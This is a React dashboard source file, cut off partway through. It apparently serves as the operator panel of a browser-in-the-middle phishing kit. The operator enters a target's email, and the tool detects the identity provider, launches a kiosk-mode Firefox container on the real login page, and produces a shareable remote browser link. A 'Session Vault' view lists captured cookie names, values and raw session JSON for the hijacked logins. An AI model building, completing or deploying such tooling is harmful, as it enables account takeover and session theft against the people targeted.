import React, { useState, useEffect } from "react";
import { motion, AnimatePresence } from "motion/react";
import { 
  Terminal, 
  Globe, 
  Mail, 
  Cpu, 
  Activity, 
  ExternalLink, 
  ShieldCheck, 
  Database as DatabaseIcon,
  Loader2,
  CheckCircle2,
  AlertCircle,
  Layers,
  ArrowRight,
  Copy,
  Check,
  RefreshCw,
  Trash2,
  Box,
  FileText,
  Key,
  Lock,
  ShieldAlert,
  Zap,
  ShieldOff,
  Code,
  MessageSquare,
  Send
} from "lucide-react";

interface ChatMessage {
  id: number;
  user_id: string;
  username: string;
  message: string;
  timestamp: string;
}

interface DomainMapping {
  id: number;
  domain: string;
  login_url: string;
}

interface AuditLog {
  id: number;
  container_id: string;
  type: string;
  content: string;
  url: string;
  timestamp: string;
}

interface FirewallRule {
  id: number;
  source_ip: string;
  action: "ALLOW" | "DROP";
  description: string;
  created_at: string;
}

interface CapturedSession {
  id: number;
  container_id: string;
  cookie_name: string;
  cookie_value: string;
  domain: string;
  raw_json: string;
  timestamp: string;
}

interface Container {
  id: string;
  name: string;
  email: string;
  domain: string;
  login_url: string;
  status: string;
  ip_address: string;
  remote_url: string;
  last_active: string;
  created_at: string;
}

interface ScalingMetric {
  id: number;
  total_cpu: number;
  total_memory: number;
  active_containers: number;
  strategy: string;
  timestamp: string;
}

interface LaunchResponse {
  success: boolean;
  email: string;
  domain: string;
  login_url: string;
  docker_command: string;
  container_id: string;
  status: string;
  ip_address: string;
  remote_url: string;
}

export default function App() {
  const [isBooting, setIsBooting] = useState(true);
  const [email, setEmail] = useState("");
  const [domains, setDomains] = useState<DomainMapping[]>([]);
  const [launchStatus, setLaunchStatus] = useState<"idle" | "launching" | "success" | "error">("idle");
  const [launchData, setLaunchData] = useState<LaunchResponse | null>(null);
  const [error, setError] = useState("");
  const [showAdmin, setShowAdmin] = useState(false);
  const [newDomain, setNewDomain] = useState({ domain: "", login_url: "" });
  const [activeTab, setActiveTab] = useState<"browser" | "terminal">("browser");
  const [mainTab, setMainTab] = useState<"orchestrator" | "config" | "containers" | "logs" | "vault" | "firewall" | "chat" | "scaling">("orchestrator");
  const [copiedLink, setCopiedLink] = useState(false);
  const [stats, setStats] = useState({ cpu: 12.4, memory: 456, uptime: 0 });
  const [activeContainers, setActiveContainers] = useState<Container[]>([]);
  const [auditLogs, setAuditLogs] = useState<AuditLog[]>([]);
  const [capturedSessions, setCapturedSessions] = useState<CapturedSession[]>([]);
  const [firewallRules, setFirewallRules] = useState<FirewallRule[]>([]);
  const [newRule, setNewRule] = useState({ source_ip: "", action: "DROP" as const, description: "" });
  const [visibleJson, setVisibleJson] = useState<Record<number, boolean>>({});
  
  // Scaling State
  const [scalingMetrics, setScalingMetrics] = useState<ScalingMetric[]>([]);
  
  // Chat State
  const [messages, setMessages] = useState<ChatMessage[]>([]);
  const [chatInput, setChatInput] = useState("");
  const [socket, setSocket] = useState<WebSocket | null>(null);
  const [visitorId] = useState(() => {
    const saved = localStorage.getItem("ops_visitor_id");
    if (saved) return saved;
    const fresh = "operator_" + Math.random().toString(36).substring(7);
    localStorage.setItem("ops_visitor_id", fresh);
    return fresh;
  });

  useEffect(() => {
    const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
    const host = window.location.host;
    const ws = new WebSocket(`${protocol}//${host}`);

    ws.onmessage = (event) => {
      const payload = JSON.parse(event.data);
      if (payload.type === "history") {
        setMessages(payload.data);
      } else if (payload.type === "message") {
        setMessages((prev) => [...prev, payload.data]);
      }
    };

    ws.onclose = () => {
      console.log("[Chat] Socket closed. Retrying...");
      // In a real app we'd add reconnect logic here
    };

    setSocket(ws);
    return () => ws.close();
  }, []);

  const handleSendMessage = (e: React.FormEvent) => {
    e.preventDefault();
    if (!chatInput.trim() || !socket) return;

    socket.send(JSON.stringify({
      type: "message",
      data: {
        user_id: visitorId,
        username: visitorId.split("_")[1].toUpperCase(),
        message: chatInput
      }
    }));
    setChatInput("");
  };

  useEffect(() => {
    const timer = setTimeout(() => setIsBooting(false), 2000);
    fetchDomains();
    fetchContainers();
    fetchLogs();
    fetchSessions();
    fetchRules();
    fetchScalingMetrics();
    return () => clearTimeout(timer);
  }, []);

  const fetchScalingMetrics = () => {
    fetch("/api/scaling-metrics")
      .then((res) => res.json())
      .then((data) => setScalingMetrics(data))
      .catch((err) => console.error("Failed to fetch scaling metrics", err));
  };

  const fetchRules = () => {
    fetch("/api/firewall-rules")
      .then((res) => res.json())
      .then((data) => setFirewallRules(data))
      .catch((err) => console.error("Failed to fetch rules", err));
  };

  const handleAddRule = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const res = await fetch("/api/firewall-rules", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(newRule)
      });
      if (res.ok) {
        setNewRule({ source_ip: "", action: "DROP", description: "" });
        fetchRules();
      }
    } catch (err) {
      console.error(err);
    }
  };

  const handleDeleteRule = async (id: number) => {
    try {
      const res = await fetch(`/api/firewall-rules/${id}`, { method: "DELETE" });
      if (res.ok) fetchRules();
    } catch (err) {
      console.error(err);
    }
  };

  const fetchLogs = () => {
    fetch("/api/audit-logs")
      .then((res) => res.json())
      .then((data) => setAuditLogs(data))
      .catch((err) => console.error("Failed to fetch logs", err));
  };

  const fetchSessions = () => {
    fetch("/api/captured-sessions")
      .then((res) => res.json())
      .then((data) => setCapturedSessions(data))
      .catch((err) => console.error("Failed to fetch sessions", err));
  };

  const fetchContainers = () => {
    fetch("/api/containers")
      .then((res) => res.json())
      .then((data) => setActiveContainers(data))
      .catch((err) => console.error("Failed to fetch containers", err));
  };

  const handleRestartContainer = async (id: string) => {
    try {
      const res = await fetch(`/api/containers/${id}/restart`, { method: "POST" });
      if (res.ok) fetchContainers();
    } catch (err) {
      console.error(err);
    }
  };

  const handleTerminateContainer = async (id: string) => {
    try {
      const res = await fetch(`/api/containers/${id}/terminate`, { method: "POST" });
      if (res.ok) fetchContainers();
    } catch (err) {
      console.error(err);
    }
  };

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (launchStatus === "success") {
      setStats({ cpu: 12.4, memory: 456, uptime: 0 });
      interval = setInterval(() => {
        setStats(prev => ({
          cpu: Math.max(5, Math.min(95, prev.cpu + (Math.random() * 4 - 2))),
          memory: Math.max(420, Math.min(780, prev.memory + (Math.random() * 20 - 10))),
          uptime: prev.uptime + 1
        }));
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [launchStatus]);

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedLink(true);
    setTimeout(() => setCopiedLink(false), 2000);
  };

  const fetchDomains = () => {
    fetch("/api/domains")
      .then((res) => res.json())
      .then((data) => setDomains(data))
      .catch((err) => console.error("Failed to fetch domains", err));
  };

  const handleAddDomain = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const res = await fetch("/api/domains", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(newDomain),
      });
      if (res.ok) {
        setNewDomain({ domain: "", login_url: "" });
        fetchDomains();
      }
    } catch (err) {
      console.error(err);
    }
  };

  const handleDeleteDomain = async (id: number) => {
    try {
      await fetch(`/api/domains/${id}`, { method: "DELETE" });
      fetchDomains();
    } catch (err) {
      console.error(err);
    }
  };

  const handleLaunch = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email) return;

    setLaunchStatus("launching");
    setError("");
    
    try {
      const response = await fetch("/api/launch-browser", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email }),
      });

      const data = await response.json();
      if (response.ok) {
        setLaunchData(data);
        setLaunchStatus("success");
      } else {
        setError(data.error || "Failed to launch container");
        setLaunchStatus("error");
      }
    } catch (err) {
      setError("Network error occurred");
      setLaunchStatus("error");
    }
  };

  if (isBooting) {
    return (
      <div className="min-h-screen bg-[#141414] text-[#E4E3E0] flex flex-col items-center justify-center font-mono p-8">
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="w-full max-w-md space-y-2"
        >
          <p className="text-emerald-400">BIOS v4.0.2 INITIALIZING...</p>
          <p>MEMORY CHECK: 64GB OK</p>
          <p>STORAGE: SQLITE_DB_MOUNTED</p>
          <p>NETWORK: STACK_READY</p>
          <motion.div 
            initial={{ width: 0 }}
            animate={{ width: "100%" }}
            transition={{ duration: 1.5, ease: "easeInOut" }}
            className="h-1 bg-emerald-400 mt-4"
          />
          <p className="text-[10px] opacity-50 mt-8">BOOTING ORCHESTRATOR KERNEL...</p>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#E4E3E0] text-[#141414] font-sans selection:bg-[#141414] selection:text-[#E4E3E0]">
      {/* Header */}
      <header className="border-b border-[#141414] p-6 flex justify-between items-center">
        <div className="flex items-center gap-3">
          <Terminal className="w-6 h-6" />
          <h1 className="font-serif italic text-xl tracking-tight">Orchestrator v1.0</h1>
        </div>
        <div className="flex items-center gap-6 text-[11px] uppercase tracking-widest opacity-50">
          <button 
            onClick={() => setShowAdmin(!showAdmin)}
            className="hover:opacity-100 transition-opacity flex items-center gap-1"
          >
            <DatabaseIcon className="w-3 h-3" /> {showAdmin ? "Close Registry" : "Manage Registry"}
          </button>
          <span className="flex items-center gap-1"><Activity className="w-3 h-3" /> System Online</span>
        </div>
      </header>

      <main className="flex-grow flex flex-col overflow-hidden">
        {/* Main Tabs */}
        <div className="bg-[#E4E3E0] border-b border-[#141414] px-8 flex gap-8">
          <button 
            onClick={() => setMainTab("orchestrator")}
            className={`py-4 text-[10px] uppercase tracking-[0.2em] font-bold transition-all ${mainTab === "orchestrator" ? "border-b-2 border-[#141414] opacity-100" : "opacity-30 hover:opacity-100"}`}
          >
            Launch_Orchestrator
          </button>
          <button 
            onClick={() => setMainTab("config")}
            className={`py-4 text-[10px] uppercase tracking-[0.2em] font-bold transition-all ${mainTab === "config" ? "border-b-2 border-[#141414] opacity-100" : "opacity-30 hover:opacity-100"}`}
          >
            System_Architecture
          </button>
          <button 
            onClick={() => {
              setMainTab("containers");
              fetchContainers();
            }}
            className={`py-4 text-[10px] uppercase tracking-[0.2em] font-bold transition-all ${mainTab === "containers" ? "border-b-2 border-[#141414] opacity-100" : "opacity-30 hover:opacity-100"}`}
          >
            Container_Registry
          </button>
          <button 
            onClick={() => {
              setMainTab("logs");
              fetchLogs();
            }}
            className={`py-4 text-[10px] uppercase tracking-[0.2em] font-bold transition-all ${mainTab === "logs" ? "border-b-2 border-[#141414] opacity-100" : "opacity-30 hover:opacity-100"}`}
          >
            Session_Auditor
          </button>
          <button 
            onClick={() => {
              setMainTab("vault");
              fetchSessions();
            }}
            className={`py-4 text-[10px] uppercase tracking-[0.2em] font-bold transition-all ${mainTab === "vault" ? "border-b-2 border-[#141414] opacity-100" : "opacity-30 hover:opacity-100"}`}
          >
            Session_Vault
          </button>
          <button 
            onClick={() => {
              setMainTab("firewall");
              fetchRules();
            }}
            className={`py-4 text-[10px] uppercase tracking-[0.2em] font-bold transition-all ${mainTab === "firewall" ? "border-b-2 border-[#141414] opacity-100" : "opacity-30 hover:opacity-100"}`}
          >
            Network_Firewall
          </button>
          <button 
            onClick={() => setMainTab("chat")}
            className={`py-4 text-[10px] uppercase tracking-[0.2em] font-bold transition-all ${mainTab === "chat" ? "border-b-2 border-[#141414] opacity-100" : "opacity-30 hover:opacity-100"}`}
          >
            Chat_Ops
          </button>
          <button 
            onClick={() => {
              setMainTab("scaling");
              fetchScalingMetrics();
            }}
            className={`py-4 text-[10px] uppercase tracking-[0.2em] font-bold transition-all ${mainTab === "scaling" ? "border-b-2 border-[#141414] opacity-100" : "opacity-30 hover:opacity-100"}`}
          >
            Elastic_Scaling
          </button>
        </div>

        <div className="flex-grow flex overflow-hidden">
          {mainTab === "orchestrator" ? (
            <div className="w-full grid grid-cols-1 lg:grid-cols-12 gap-0 overflow-hidden">
              {/* Control Panel */}
              <section className="lg:col-span-5 p-8 border-r border-[#141414] border-opacity-10 overflow-y-auto">
          <AnimatePresence mode="wait">
            {showAdmin ? (
              <motion.div
                key="admin"
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                className="space-y-6"
              >
                <div className="space-y-2">
                  <h3 className="text-2xl font-light tracking-tight">Domain Registry</h3>
                  <p className="text-xs opacity-60">Add or remove identity provider mappings.</p>
                </div>

                <form onSubmit={handleAddDomain} className="space-y-2">
                  <input
                    placeholder="domain.com"
                    value={newDomain.domain}
                    onChange={(e) => setNewDomain({ ...newDomain, domain: e.target.value })}
                    className="w-full bg-transparent border border-[#141414] p-2 text-sm focus:outline-none"
                    required
                  />
                  <input
                    placeholder="https://login.url"
                    value={newDomain.login_url}
                    onChange={(e) => setNewDomain({ ...newDomain, login_url: e.target.value })}
                    className="w-full bg-transparent border border-[#141414] p-2 text-sm focus:outline-none"
                    required
                  />
                  <button type="submit" className="w-full bg-[#141414] text-[#E4E3E0] p-2 text-xs uppercase tracking-widest">
                    Register Domain
                  </button>
                </form>

                <div className="max-h-64 overflow-y-auto border border-[#141414] border-opacity-10">
                  {domains.map((d) => (
                    <div key={d.id} className="p-3 border-b border-[#141414] border-opacity-10 flex justify-between items-center text-xs">
                      <div>
                        <p className="font-bold">{d.domain}</p>
                        <p className="opacity-50 truncate max-w-[150px]">{d.login_url}</p>
                      </div>
                      <button 
                        onClick={() => handleDeleteDomain(d.id)}
                        className="text-red-500 hover:underline"
                      >
                        Delete
                      </button>
                    </div>
                  ))}
                </div>
              </motion.div>
            ) : (
              <motion.div
                key="launch"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: 20 }}
                className="space-y-8"
              >
                <div className="space-y-4">
                  <h2 className="text-4xl font-light tracking-tighter leading-none">
                    Launch Isolated <br />
                    <span className="font-serif italic">Browser Instance</span>
                  </h2>
                  <p className="text-sm opacity-70 max-w-md">
                    Enter a user email to automatically detect the target identity provider and provision a dedicated container instance.
                  </p>
                </div>

                <form onSubmit={handleLaunch} className="space-y-4">
                  <div className="relative">
                    <label className="text-[10px] uppercase tracking-widest opacity-50 mb-1 block">Target Email Address</label>
                    <div className="relative">
                      <Mail className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 opacity-40" />
                      <input
                        type="email"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        placeholder="user@example.com"
                        className="w-full bg-transparent border border-[#141414] p-4 pl-12 focus:outline-none focus:ring-1 focus:ring-[#141414] transition-all placeholder:opacity-30"
                        required
                      />
                    </div>
                  </div>

                  <button
                    type="submit"
                    disabled={launchStatus === "launching"}
                    className="w-full bg-[#141414] text-[#E4E3E0] p-4 font-serif italic text-lg hover:bg-opacity-90 transition-all disabled:opacity-50 flex justify-center items-center gap-2"
                  >
                    {launchStatus === "launching" ? (
                      <>
                        <Loader2 className="w-5 h-5 animate-spin" />
                        Provisioning...
                      </>
                    ) : (
                      "Initialize Container"
                    )}
                  </button>
                </form>

                {/* Supported Domains List (Mini) */}
                <div className="border-t border-[#141414] pt-6">
                  <div className="flex items-center gap-2 mb-4">
                    <DatabaseIcon className="w-4 h-4 opacity-50" />
                    <h3 className="text-[10px] uppercase tracking-widest opacity-50">Active Providers ({domains.length})</h3>
                  </div>
                  <div className="flex flex-wrap gap-2">
                    {domains.slice(0, 6).map((d) => (
                      <span key={d.id} className="text-[10px] font-mono px-2 py-1 border border-[#141414] border-opacity-20">
                        {d.domain}
                      </span>
                    ))}
                    {domains.length > 6 && <span className="text-[10px] opacity-50">+{domains.length - 6} more</span>}
                  </div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </section>

        {/* Status Panel */}
        <section className="lg:col-span-7">
          <AnimatePresence mode="wait">
            {launchStatus === "idle" ? (
              <motion.div
                key="idle"
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -20 }}
                className="h-full border border-[#141414] border-dashed flex flex-col items-center justify-center p-12 text-center opacity-30"
              >
                <Cpu className="w-12 h-12 mb-4" />
                <p className="font-serif italic text-xl">Waiting for initialization...</p>
                <p className="text-xs mt-2">Container resources will be allocated upon request.</p>
              </motion.div>
            ) : launchStatus === "launching" ? (
              <motion.div
                key="launching"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
                className="h-full border border-[#141414] p-8 flex flex-col"
              >
                <div className="flex justify-between items-start mb-8">
                  <div>
                    <h3 className="text-2xl font-light tracking-tight">Provisioning Instance</h3>
                    <p className="text-xs font-mono opacity-50">ALLOCATING_RESOURCES...</p>
                  </div>
                  <Loader2 className="w-6 h-6 animate-spin" />
                </div>
                
                <div className="space-y-4 flex-grow">
                  {[
                    "Detecting identity provider...",
                    "Querying domain registry...",
                    "Initializing sandbox environment...",
                    "Configuring network proxy...",
                    "Injecting START_URL parameter..."
                  ].map((step, i) => (
                    <motion.div 
                      key={i}
                      initial={{ opacity: 0, x: -10 }}
                      animate={{ opacity: 1, x: 0 }}
                      transition={{ delay: i * 0.4 }}
                      className="flex items-center gap-3 text-sm font-mono"
                    >
                      <div className="w-1 h-1 bg-[#141414]" />
                      {step}
                    </motion.div>
                  ))}
                </div>
              </motion.div>
            ) : launchStatus === "success" && launchData ? (
              <motion.div
                key="success"
                initial={{ opacity: 0, scale: 0.98 }}
                animate={{ opacity: 1, scale: 1 }}
                className="h-full border-2 border-[#141414] bg-[#141414] text-[#E4E3E0] flex flex-col overflow-hidden"
              >
                {/* Container Header */}
                <div className="bg-[#2A2A2A] p-3 flex justify-between items-center border-b border-white border-opacity-10">
                  <div className="flex items-center gap-4">
                    <div className="flex gap-1.5">
                      <div className="w-2.5 h-2.5 rounded-full bg-red-500/50" />
                      <div className="w-2.5 h-2.5 rounded-full bg-yellow-500/50" />
                      <div className="w-2.5 h-2.5 rounded-full bg-green-500/50" />
                    </div>
                    <div className="h-4 w-px bg-white opacity-10" />
                    <div className="flex gap-4 text-[10px] font-mono uppercase tracking-widest">
                      <button 
                        onClick={() => setActiveTab("browser")}
                        className={`transition-opacity ${activeTab === "browser" ? "opacity-100 border-b border-white" : "opacity-40 hover:opacity-100"}`}
                      >
                        Remote_Browser
                      </button>
                      <button 
                        onClick={() => setActiveTab("terminal")}
                        className={`transition-opacity ${activeTab === "terminal" ? "opacity-100 border-b border-white" : "opacity-40 hover:opacity-100"}`}
                      >
                        Docker_Terminal
                      </button>
                    </div>
                  </div>
                  <div className="flex items-center gap-3 text-[10px] font-mono opacity-50">
                    <span>IP: {launchData.ip_address}</span>
                    <span className="text-emerald-400">● LIVE</span>
                  </div>
                </div>

                {/* Content Area */}
                <div className="flex-grow relative overflow-hidden bg-white">
                  <AnimatePresence mode="wait">
                    {activeTab === "browser" ? (
                      <motion.div
                        key="browser-view"
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className="absolute inset-0 flex flex-col"
                      >
                        {/* Browser Chrome */}
                        <div className="bg-[#F0F0F0] p-2 flex items-center gap-2 border-b border-gray-300">
                          <div className="flex gap-2 px-2">
                            <div className="w-3 h-3 rounded-full bg-gray-300" />
                            <div className="w-3 h-3 rounded-full bg-gray-300" />
                          </div>
                          <div className="flex-grow bg-white border border-gray-300 rounded px-3 py-1 text-[10px] text-gray-500 font-mono truncate">
                            {launchData.login_url}
                          </div>
                          <ExternalLink className="w-3 h-3 text-gray-400 mr-2" />
                        </div>
                        {/* Browser Content (Simulated) */}
                        <div className="flex-grow bg-white flex flex-col items-center justify-center p-12 text-center text-[#141414]">
                          <Globe className="w-16 h-16 mb-6 opacity-10" />
                          <h4 className="text-2xl font-light tracking-tight mb-2">Isolated Session Active</h4>
                          <p className="text-sm opacity-60 max-w-md mb-6">
                            The browser has been launched inside the container. For security, some identity providers may block direct embedding.
                          </p>
                          
                          <div className="flex flex-col items-center gap-4 w-full max-w-sm mb-8">
                            <div className="w-full flex items-center gap-2 p-3 bg-gray-100 rounded border border-gray-200">
                              <div className="flex-grow text-[11px] font-mono text-[#141414] truncate">
                                {launchData.remote_url}
                              </div>
                              <button 
                                onClick={() => copyToClipboard(launchData.remote_url)}
                                className="p-1.5 hover:bg-gray-200 rounded transition-colors text-gray-500"
                              >
                                {copiedLink ? <Check className="w-3.5 h-3.5 text-green-600" /> : <Copy className="w-3.5 h-3.5" />}
                              </button>
                            </div>
                            <a 
                              href={launchData.remote_url} 
                              target="_blank" 
                              rel="noopener noreferrer"
                              className="w-full bg-[#141414] text-white px-8 py-3 font-serif italic text-lg hover:bg-opacity-80 transition-all text-center flex items-center justify-center gap-2"
                            >
                              Open Remote Browser <ExternalLink className="w-4 h-4" />
                            </a>
                          </div>
                        </div>
                      </motion.div>
                    ) : (
                      <motion.div
                        key="terminal-view"
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className="absolute inset-0 bg-[#0A0A0A] p-6 font-mono text-[11px] leading-relaxed overflow-y-auto text-emerald-500"
                      >
                        <div className="space-y-1">
                          <p className="text-white opacity-50"># Initializing Docker Engine...</p>
                          <p className="text-white opacity-50"># Pulling image jlesage/firefox:latest...</p>
                          <p className="text-white opacity-50"># Image up to date.</p>
                          <p className="text-white opacity-50"># Resolving MX records for domain...</p>
                          <p className="text-white opacity-50"># Provider identified via MX record.</p>
                          <p className="mt-4 break-all text-white">
                            <span className="text-emerald-400">$</span> {launchData.docker_command}
                          </p>
                          <p className="mt-4 text-emerald-400/80">Container ID: {launchData.container_id}</p>
                          <p className="text-emerald-400/80">Status: Created</p>
                          <p className="text-emerald-400/80">Network: Bridge (172.17.0.0/16)</p>
                          <p className="text-emerald-400/80">Assigned IP: {launchData.ip_address}</p>
                          <p className="mt-4 text-white opacity-50"># Starting Firefox process...</p>
                          <p className="text-white opacity-50"># Xvfb initialized</p>
                          <p className="text-white opacity-50"># Enabling --kiosk mode</p>
                          <p className="text-white opacity-50"># Navigating to {launchData.login_url}...</p>
                          <p className="text-emerald-400 font-bold mt-4 animate-pulse">READY: LISTENING ON PORT 5800</p>
                        </div>
                      </motion.div>
                    )}
                  </AnimatePresence>
                </div>

                {/* Container Footer / Stats */}
                <div className="bg-[#141414] p-4 border-t border-white border-opacity-10 flex justify-between items-center">
                  <div className="flex gap-8">
                    <div className="space-y-1">
                      <span className="text-[8px] uppercase tracking-widest opacity-40">CPU Usage</span>
                      <div className="flex items-center gap-2">
                        <div className="w-24 h-1 bg-white/10 rounded-full overflow-hidden">
                          <motion.div 
                            animate={{ width: `${stats.cpu}%` }} 
                            transition={{ type: "spring", stiffness: 100, damping: 20 }}
                            className="h-full bg-emerald-400" 
                          />
                        </div>
                        <span className="text-[9px] font-mono w-10 text-right">{stats.cpu.toFixed(1)}%</span>
                      </div>
                    </div>
                    <div className="space-y-1">
                      <span className="text-[8px] uppercase tracking-widest opacity-40">Memory</span>
                      <div className="flex items-center gap-2">
                        <div className="w-24 h-1 bg-white/10 rounded-full overflow-hidden">
                          <motion.div 
                            animate={{ width: `${(stats.memory / 1024) * 100}%` }} 
                            transition={{ type: "spring", stiffness: 100, damping: 20 }}
                            className="h-full bg-blue-400" 
                          />
                        </div>
                        <span className="text-[9px] font-mono w-10 text-right">{stats.memory.toFixed(0)}MB</span>
                      </div>
                    </div>
                    <div className="space-y-1">
                      <span className="text-[8px] uppercase tracking-widest opacity-40">Uptime</span>
                      <div className="text-[9px] font-mono text-white/70">
                        {Math.floor(stats.uptime / 60)}m {stats.uptime % 60}s
                      </div>
                    </div>
                  </div>
                  <button 
                    onClick={() => setLaunchStatus("idle")}
                    className="text-[10px] uppercase tracking-widest opacity-50 hover:opacity-100 transition-opacity border border-white border-opacity-20 px-3 py-1 hover:bg-white hover:text-[#141414]"
                  >
                    Kill Container
                  </button>
                </div>
              </motion.div>
            ) : (
              <motion.div
                key="error"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                className="h-full border border-red-500 p-8 flex flex-col items-center justify-center text-center"
              >
                <AlertCircle className="w-12 h-12 text-red-500 mb-4" />
                <h3 className="text-2xl font-light tracking-tight mb-2">Launch Failed</h3>
                <p className="text-sm opacity-70 mb-6">{error}</p>
                <button 
                  onClick={() => setLaunchStatus("idle")}
                  className="px-6 py-2 border border-[#141414] text-xs uppercase tracking-widest hover:bg-[#141414] hover:text-[#E4E3E0] transition-all"
                >
                  Reset Orchestrator
                </button>
              </motion.div>
            )}
          </AnimatePresence>
        </section>
        </div>
      ) : mainTab === "firewall" ? (
        <div className="flex-grow p-12 bg-[#E4E3E0] overflow-y-auto">
          <div className="max-w-6xl mx-auto">
            <div className="flex items-center justify-between mb-12">
              <div className="flex items-center gap-4">
                <div className="w-12 h-12 bg-[#141414] text-white flex items-center justify-center">
                  <ShieldAlert className="w-6 h-6" />
                </div>
                <div>
                  <h2 className="text-3xl font-light tracking-tight">Software Defined Firewall</h2>
                  <p className="text-xs opacity-50 font-mono uppercase tracking-widest">iptables & user-space filtering</p>
                </div>
              </div>
              <div className="flex gap-4">
                <div className="flex items-center gap-2 px-4 py-2 bg-emerald-100 text-emerald-800 rounded-full text-[9px] font-bold uppercase tracking-widest">
                  <Zap className="w-3 h-3" /> Kernel Acceleration Active
                </div>
              </div>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-3 gap-12">
              <div className="lg:col-span-1 space-y-8">
                <section className="bg-white p-8 border border-[#141414] border-opacity-10">
                  <h4 className="font-serif italic text-xl mb-6">New Filter Rule</h4>
                  <form onSubmit={handleAddRule} className="space-y-4">
                    <div className="space-y-1">
                      <label className="text-[9px] uppercase tracking-widest opacity-40">Source IP / CIDR</label>
                      <input 
                        type="text" 
                        placeholder="e.g. 192.168.1.1 or 0.0.0.0/0"
                        value={newRule.source_ip}
                        onChange={(e) => setNewRule({...newRule, source_ip: e.target.value})}
                        className="w-full bg-gray-50 border border-[#141414] border-opacity-10 p-3 text-xs font-mono focus:outline-none focus:ring-1 focus:ring-[#141414]"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-[9px] uppercase tracking-widest opacity-40">Policy Action</label>
                      <select 
                        value={newRule.action}
                        onChange={(e) => setNewRule({...newRule, action: e.target.value as "ALLOW" | "DROP"})}
                        className="w-full bg-gray-50 border border-[#141414] border-opacity-10 p-3 text-xs focus:outline-none font-bold"
                      >
                        <option value="ALLOW">ACCEPT (Standard)</option>
                        <option value="DROP">DROP (Strict)</option>
                      </select>
                    </div>
                    <div className="space-y-1">
                      <label className="text-[9px] uppercase tracking-widest opacity-40">Rule Description</label>
                      <textarea 
                        placeholder="Purpose of this filter..."
                        value={newRule.description}
                        onChange={(e) => setNewRule({...newRule, description: e.target.value})}
                        className="w-full bg-gray-50 border border-[#141414] border-opacity-10 p-3 text-xs focus:outline-none resize-none h-24"
                      />
                    </div>
                    <button 
                      type="submit"
                      className="w-full bg-[#141414] text-white py-4 text-[10px] uppercase tracking-widest font-bold hover:bg-opacity-90 transition-all"
                    >
                      Apply iptables Rule
                    </button>
                  </form>
                </section>

                <div className="p-6 bg-blue-50 border border-blue-200">
                  <h5 className="text-[10px] uppercase tracking-widest font-bold text-blue-900 mb-2">Live Chain Stats</h5>
                  <div className="space-y-2">
                    <div className="flex justify-between text-[10px]">
                      <span className="opacity-60">DOCKER-USER Inbound</span>
                      <span className="font-mono">1.2 GB / day</span>
                    </div>
                    <div className="flex justify-between text-[10px]">
                      <span className="opacity-60">Packet Drops (Total)</span>
                      <span className="font-mono text-red-600">4,210 pkts</span>
                    </div>
                  </div>
                </div>
              </div>

              <div className="lg:col-span-2">
                <div className="bg-white border border-[#141414] border-opacity-10 overflow-hidden">
                  <table className="w-full text-left border-collapse">
                    <thead>
                      <tr className="bg-gray-50 border-b border-[#141414] border-opacity-10">
                        <th className="p-4 text-[10px] uppercase tracking-widest opacity-40 font-bold">Rule ID</th>
                        <th className="p-4 text-[10px] uppercase tracking-widest opacity-40 font-bold">Source Selector</th>
                        <th className="p-4 text-[10px] uppercase tracking-widest opacity-40 font-bold">Action</th>
                        <th className="p-4 text-[10px] uppercase tracking-widest opacity-40 font-bold">Target / Desc</th>
                        <th className="p-4 shrink-0 w-20"></th>
                      </tr>
                    </thead>
                    <tbody className="text-[11px] font-mono">
                      {firewallRules.map((rule) => (
                        <tr key={rule.id} className="border-b border-gray-100 group">
                          <td className="p-4 opacity-50">#{rule.id}</td>
                          <td className="p-4 font-bold">{rule.source_ip}</td>
                          <td className="p-4">
                            <span className={`px-2 py-0.5 rounded ${rule.action === 'ALLOW' ? 'bg-emerald-100 text-emerald-800' : 'bg-red-100 text-red-800'}`}>
                              {rule.action}
                            </span>
                          </td>
                          <td className="p-4 opacity-70 italic">{rule.description}</td>
                          <td className="p-4 text-right">
                            <button 
                              onClick={() => handleDeleteRule(rule.id)}
                              className="text-red-300 hover:text-red-600 transition-colors"
                              title="Delete Rule"
                            >
                              <ShieldOff className="w-4 h-4" />
                            </button>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
                
                <div className="mt-8 text-[10px] opacity-40 font-mono italic leading-relaxed">
                  # Rules processed in priority order starting from top. <br />
                  # Standard Docker 'DOCKER-USER' chain is used for bypass safety.
                </div>
              </div>
            </div>
          </div>
        </div>
      ) : mainTab === "config" ? (
        <div className="flex-grow p-12 bg-[#E4E3E0] overflow-y-auto">
          <div className="max-w-4xl mx-auto space-y-16">
            <section>
              <div className="flex items-center gap-4 mb-8">
                <div className="w-12 h-12 bg-[#141414] text-white flex items-center justify-center">
                  <Layers className="w-6 h-6" />
                </div>
                <div>
                  <h2 className="text-3xl font-light tracking-tight">Production Architecture</h2>
